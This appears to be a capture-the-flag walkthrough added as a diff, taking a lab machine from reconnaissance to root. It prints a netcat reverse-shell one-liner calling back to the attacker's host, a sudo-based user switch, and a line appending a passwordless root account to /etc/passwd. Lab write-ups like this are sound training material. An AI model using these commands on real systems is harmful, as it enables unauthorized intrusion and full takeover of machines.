@@ -1,0 +1,78 @@
+$ netdiscover -i wlp2s0
+192.168.1.8
+
+
+$nmap -sV 192.168.1.8 -p- -Pn -T4
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    Rocket httpd 1.2.6 (Python 2.7.15rc1)
+3306/tcp open  mysql   MySQL (unauthorized)
+8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+# dirb results on port 8080
+
+
+---- Scanning URL: http://192.168.1.8:8080/ ----
+==> DIRECTORY: http://192.168.1.8:8080/css/                                                                                                                  
+==> DIRECTORY: http://192.168.1.8:8080/debug/                                                                                                                
+==> DIRECTORY: http://192.168.1.8:8080/development/                                                                                                          
+==> DIRECTORY: http://192.168.1.8:8080/help/                                                                                                                 
+==> DIRECTORY: http://192.168.1.8:8080/images/                                                                                                               
++ http://192.168.1.8:8080/index.html (CODE:200|SIZE:10918)                                                                                                   
+==> DIRECTORY: http://192.168.1.8:8080/js/                                                                                                                   
+==> DIRECTORY: http://192.168.1.8:8080/manual/                                                                                                               
+==> DIRECTORY: http://192.168.1.8:8080/scripts/                                                                                                              
++ http://192.168.1.8:8080/server-status (CODE:403|SIZE:301)                                                                                                  
+==> DIRECTORY: http://192.168.1.8:8080/shell/                                                                                                                
+==> DIRECTORY: http://192.168.1.8:8080/wordpress/   
+
+I found a shell in /debug directory and  I got a revershell to my local machine
+
+$ nc -lnvp 4444
+
+on the debug shell execute
+
+$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.12 4444 >/tmp/f
+
+
+we got the shell
+
+lets get a proper shell
+
+$ python -c "import pty; pty.spawn('/bin/bash')"
+
+
+$ sudo -l
+
+Matching Defaults entries for www-data on localhost:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on localhost:
+    (brexit) NOPASSWD: /bin/bash
+	
+	as you see we can execute /bin/bash as user brexit
+	
+$ sudo -u brexit /bin/bash
+
+$ whoami 
+brexit
+
+$ ls -la /etc/passwd
+-rwxrwxr-- 1 root brexit 1617 Jun  1  2019 /etc/passwd
+
+as you see /etc/passwd directory is writable by brexit
+
+lets write it with a new user that is in the root group
+
+$ echo "user::0:0:root:/root:/bin/bash" >> /etc/passwd
+
+$su user
+
+$ cat /root/root.txt
+
+0d2c6222bfdd3701e0fa12a9a9dc9c8c
+
